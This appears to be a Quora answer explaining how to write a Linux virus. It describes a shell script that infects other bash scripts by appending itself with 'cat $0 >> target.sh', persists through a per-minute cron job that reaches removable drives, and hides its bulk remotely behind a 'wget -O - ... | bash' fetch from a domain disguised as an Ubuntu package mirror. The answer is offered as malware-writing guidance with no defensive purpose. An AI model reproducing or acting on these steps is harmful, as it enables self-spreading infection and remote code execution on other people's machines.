https://www.quora.com/How-can-I-make-a-virus-from-Linux/answer/Aravind-Reddy-V

How:

* Write a shell script that recursively searches for shell scripts in a disk. [.sh extension or #!/bin/bash at start]
* Decide on a very particular string. When a file is a bash script, search for  the decided on string and if it’s not found, add all the contents of your script to the target script. cat $0 >> target.sh 
* The string is so that we don't have multiple copies of our script in a file.
* Now, whenever the infected script is executed, our code is also run.
* Add the script to user’s cronjob and make it run once every minute and run on all disks including removable drives. You can programatically add a cronjob (https://stackoverflow.com/questions/4880290/how-do-i-create-a-crontab-through-a-script).
Now, you don't want your code to be sticking out of the infected file and be detected. Keep the bulk of your code remote.
wget -O - http://fake-apt-ubuntu-com.com/file | bash

Development scheduled to start post 14th of December, 2017.
